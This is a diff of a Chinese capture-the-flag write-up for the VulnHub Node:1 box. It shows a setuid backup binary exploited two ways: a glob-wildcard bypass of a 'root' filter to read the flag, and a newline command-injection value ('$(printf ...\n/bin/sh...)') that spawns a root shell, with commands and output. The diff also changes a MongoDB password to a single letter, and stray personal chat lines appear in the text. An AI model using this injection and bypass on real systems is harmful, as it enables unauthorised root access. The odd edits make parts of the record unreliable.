@@ -70,7 +70,7 @@ Content-Length: 39
 {"username":"admin","password":"admin"}
 ```
 
-尝试二级目录扫描`/api`路径，得到`/api/usrs`
+尝试二级目录扫描`/api`路径，得到`/api/users`
 
 ```shell
 (py311) ┌──(kali㉿kali)-[~/vulnhub/node:1]
@@ -147,7 +147,7 @@ const ObjectID    = require('mongodb').ObjectID;
 const path        = require("path");
 const spawn        = require('child_process').spawn;
 const app         = express();
-const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
+const url         = 'mongodb://mark:c@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
 const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
 ```
 
@@ -401,7 +401,7 @@ const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d023016710
 '|'
 ```
 
-最后会将目标路径放到`/usr/bin/zip -r -P magicword %s %s >/dev/null`的第二个参数处用于zip压缩备份
+最后会将目标路径放到`/usr/bin/zip -r -P magicword %s %s >/dev/null`的第二个参数处用于zip压缩备份，使用system函数执行
 
 v25最程序最开始被赋值为0，当使用了-q参数则会赋值为1，说明这个参数用于是否启用静默输出
 
@@ -414,6 +414,73 @@ v25最程序最开始被赋值为0，当使用了-q参数则会赋值为1，说�
 呜呜呜 这题好难嘻嘻 爱你宝宝 去吧 臭宝宝 爱你嗯爱你去吧去吧
 
 我会把打的这些字放到我博客上 好呀 笨猪 哈哈哈 去忙吧 好滴
+
+---
+
+重来，基于以上对程序的分析能知道整体的程序运作逻辑
+
+1.必须对程序传递3个参数
+
+2.第一参数为-q 第二个参数为backup_key 第三个参数为要备份的目标路径
+
+3.目标路径有一些过滤条件
+
+4.备份使用的是zip命令进行打包
+
+5.备份成功则会把备份后的zip进行base64编码后输出
+
+那么整体思路如下
+
+1.能否bypass对目标路径的关键字过滤？
+
+2.能否通过bypass做命令注入？
+
+## method 1: bypass keyword:root to read /root/root.txt
+
+可以通过glob通配符绕过对root关键字的过滤直接读取/root/root.txt
+
+```shell
+(remote) tom@node:/usr/local/bin$ backup  -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt | base64 -d > /tmp/root.zip
+(remote) tom@node:/usr/local/bin$ unzip /tmp/root.zip -d /tmp/
+Archive:  /tmp/root.zip
+[/tmp/root.zip] root/root.txt password: 
+ extracting: /tmp/root/root.txt      
+(remote) tom@node:/usr/local/bin$ cat /tmp/root/root.txt 
+1722e99ca5f353b362556a62bd5e6be0
+```
+
+## method 2: bypass filter
+
+第三个参数使用`"$(printf 'aaa\n/bin/sh\nid')"`
+
+```shell
+(remote) tom@node:/usr/local/bin$ backup  -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf 'aaa\n/bin/sh\nid')"
+        zip warning: name not matched: aaa
+
+zip error: Nothing to do! (try: zip -r -P magicword /tmp/.backup_753497871 . -i aaa)
+\[\](remote)\[\] \[\]root@node\[\]:\[\]/usr/local/bin\[\]$ id
+uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1002(admin)
+```
+
+这个payload的执行流程如下
+
+`"$(printf 'aaa\n/bin/sh\nid')"`首先会在当前的tom用户shell上生成一个包含换行符的单字符
+
+```text
+aaa
+/bin/sh
+id
+```
+
+backup程序会对其进行关键字过滤，但其并不包含黑名单字符，验证将通过
+
+systme函数接收后会将换行符视作分隔符，等同于执行三个命令
+
+```shell
+/usr/bin/zip -r -P magicword /tmp/.backup_753497871 aaa   -> aaa路径不存在 输出报错
+/bin/sh  -> 执行/bin/sh生成shell
+id > /dev/null -> 执行id命令 放到/dev/null 无回显
+```
 
 # shell as root by kernel-pe
 
